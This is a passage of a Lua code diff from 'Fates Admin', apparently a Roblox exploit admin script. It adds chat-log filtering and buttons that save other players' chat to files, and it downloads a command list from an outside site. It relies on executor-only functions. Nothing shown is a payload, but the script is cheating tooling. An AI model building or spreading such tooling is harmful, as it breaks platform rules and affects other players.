+	for _, v in ipairs(AdminChatLogs.Frame.List:GetChildren()) do
+		if (not v:IsA("UIListLayout")) then
+			local Message = v.Text
+
+			v.Visible = string.find(string.lower(Message), Text, 1, true)
+		end
+	end
+
+	-- AdminChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, AdminChatLogs.Frame.List.UIListLayout.AbsoluteContentSize.Y)
+end)
+
+-- save to txt
+ChatLogs.Save.MouseButton1Click:Connect(function()
+	local String = "Fates Admin Chat Logs\n\n"
+	local Name = string.format("%s (%s).txt",  MarketplaceService:GetProductInfo(game.PlaceId).Name, os.date("%x"):gsub("/", "-")) -- Didn't work because you can't have / in file names
+	for _, v in ipairs(ChatLogs.Frame.List:GetChildren()) do
+		if (not v:IsA("UIListLayout")) then
+			String = String .. v.Text .. "\n"
+		end
+	end
+
+	writefile(Name, String) -- not working idk why (fixed btw who ever made this)
+	Utils.Notify(Caller or LocalPlayer, "Saved", "Chat logs saved!", 5);
+end)
+AdminChatLogs.Save.MouseButton1Click:Connect(function()
+	local String = "Fates Admin Chat Logs\n\n"
+	local Name = string.format("%s (%s).txt",  MarketplaceService:GetProductInfo(game.PlaceId).Name, os.date("%x"):gsub("/", "-")) -- Didn't work because you can't have / in file names
+	for _, v in ipairs(AdminChatLogs.Frame.List:GetChildren()) do
+		if (not v:IsA("UIListLayout")) then
+			String = String .. v.Text .. "\n"
+		end
+	end
+
+	writefile(Name, String) -- not working idk why (fixed btw who ever made this)
+	Utils.Notify(Caller or LocalPlayer, "Saved", "Chat logs saved!", 5);
+end)
+
+if (not isfile("fates admin commands/commands.txt")) then
+	makefolder("fates admin commands");
+	if syn then
+	    writefile("fates admin commands/commands.txt", tostring(game:HttpGet("https://fate0.xyz/scripts/fates-admin/commands")));
+        writefile("fates admin commands/change below to .html .txt", "to see the commands change rename commands.txt to commands.html");
+    else
+		writefile("fates admin commands/commands.html", game:HttpGet("https://fate0.xyz/scripts/fates-admin/commands"));
+	end
+end
+Utils.Notify(Caller or LocalPlayer, "Info", ("Press %s to Open the Command Bar"):format(string.char(CommandBarPrefix.Value)), 10);
+Utils.Notify(Caller or LocalPlayer, "Loaded", ("Script loaded in %.3fs"):format(tick() - start));
+getgenv().FA_Loaded = true
+
+print([[                                                                                                                                                                                                                                                  
+	___                                                                   ____                        
+.--.,              ,--.'|_                                                  ,---,        ,'  , `.  ,--,                
+,--.'  \             |  | :,'                                               ,---.'|     ,-+-,.' _ |,--.'|         ,---,  
+|  | /\/             :  : ' :             .--.--.                           |   | :  ,-+-. ;   , |||  |,      ,-+-. /  | 
+:  : :    ,--.--.  .;__,'  /     ,---.   /  /    '             ,--.--.      |   | | ,--.'|'   |  ||`--'_     ,--.'|'   | 
+:  | |-, /       \ |  |   |     /     \ |  :  /`./            /       \   ,--.__| ||   |  ,', |  |,,' ,'|   |   |  ,"' | 
+|  : :/|.--.  .-. |:__,'| :    /    /  ||  :  ;_             .--.  .-. | /   ,'   ||   | /  | |--' '  | |   |   | /  | | 
+|  |  .' \__\/: . .  '  : |__ .    ' / | \  \    `.           \__\/: . ..   '  /  ||   : |  | ,    |  | :   |   | |  | | 
+'  : '   ," .--.; |  |  | '.'|'   ;   /|  `----.   \          ," .--.; |'   ; |:  ||   : |  |/     '  : |__ |   | |  |/  
+|  | |  /  /  ,.  |  ;  :    ;'   |  / | /  /`--'  /         /  /  ,.  ||   | '/  '|   | |`-'      |  | '.'||   | |--'   
+|  : \ ;  :   .'   \ |  ,   / |   :    |'--'.     /         ;  :   .'   \   :    :||   ;/          ;  :    ;|   |/       
+|  |,' |  ,     .-./  ---`-'   \   \  /   `--'---'          |  ,     .-./\   \  /  '---'           |  ,   / '---'        
+`--'    `--`---'                `----'                       `--`---'     `----'                    ---`-'               
+
+]])
